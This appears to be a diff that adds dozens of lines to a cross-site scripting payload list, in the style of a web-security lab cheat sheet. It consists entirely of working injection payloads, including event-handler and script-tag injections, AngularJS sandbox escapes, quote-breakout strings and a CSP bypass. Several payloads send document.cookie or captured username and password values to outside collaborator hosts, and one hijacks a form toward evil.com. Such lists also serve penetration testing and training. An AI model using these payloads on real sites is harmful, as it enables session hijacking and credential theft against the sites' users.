@@ -69,3 +69,49 @@ javascript:fetch('https://yourcollab.com',{method:'POST',body:document.cookie})
 "><img src="x" onerror=top.location='https://yourcollab.com?cookie='+document.cookie>
 </h1><iframe srcdoc="<script>alert(1)</script>">
 <script src="data:text/javascript,alert(1)"></script>
+
+
+
+</h1><script>alert(1)</script>
+<script>alert(2)</script>
+"><img src=1 onerror=alert(1)>
+"><svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+<a href="javascript:alert(document.cookie)">Click me</a>
+<iframe src="https://example.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+" onmouseover="alert(1)
+"+alert(1)+"
+'+alert(1)+'
+"-alert(1)-"
+"/1/+alert(1)//
+"/a/+alert(1)//
+"+alert(1)+""
+"+alert(String.fromCharCode(88,83,83))+"
+"></select><img src=1 onerror=alert(1)>
+{{$on.constructor('alert(1)')()}}
+{{$watch.constructor('alert(1)')()}}
+\"-alert(1)}//
+\"+alert(1)}//
+\"&alert(1)}//
+\"|alert(1)}//
+<><img src=1 onerror=alert(1)>
+<iframe src="?search=<body onresize=alert(1)>" onload=this.style.width='100px'>
+<robin onclick=alert(1)>
+<svg id=x onbegin=alert(1)>
+<svg><animatetransform onbegin=alert(1)>
+?'accesskey='x'onclick='alert(1)
+</script><script>alert(1)</script>
+\'-alert(1)//
+\'+alert(1)//
+&#39;+alert(1)+&#39;
+&#x27;+alert(1)+&#x27;
+${alert(1)}
+<script>fetch('https://your-id.oastify.com',{method:'POST',mode:'no-cors',body:document.cookie})</script>
+<input type=password name=password onchange="fetch('https://your-id.oastify.com',{method:'POST',mode:'no-cors',body:username.value+':'+this.value})">
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>#x
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click</text></a>
+href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=4'}).finally(()=>location='/')"
+post?postId=3&'},x=x=>{{onerror=alert}throw/**/1337},toString=x,window+'',{x:'
+<script>location='https://site.com/my-account?email="></form><form action=https://evil.com method=GET><button>Click</button';</script>
+/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+toString().constructor.prototype.charAt=[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
